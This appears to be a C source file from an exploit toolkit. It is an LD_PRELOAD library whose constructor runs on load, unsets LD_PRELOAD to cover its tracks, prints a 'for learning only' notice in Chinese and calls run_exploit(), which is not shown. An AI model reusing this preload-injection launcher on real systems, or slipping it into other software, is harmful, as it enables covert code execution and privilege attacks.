#include "common.h"
__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  unsetenv("LD_PRELOAD");

  char *argv[2] = {
    "preload.so",
    NULL,
  };

  pr_success("preload starting pid=%d\n", getpid());
  pr_success("酷安@本地主机制作，请勿倒卖，仅供学习使用，请在24小时后删除\n");
  run_exploit(1, argv);
}
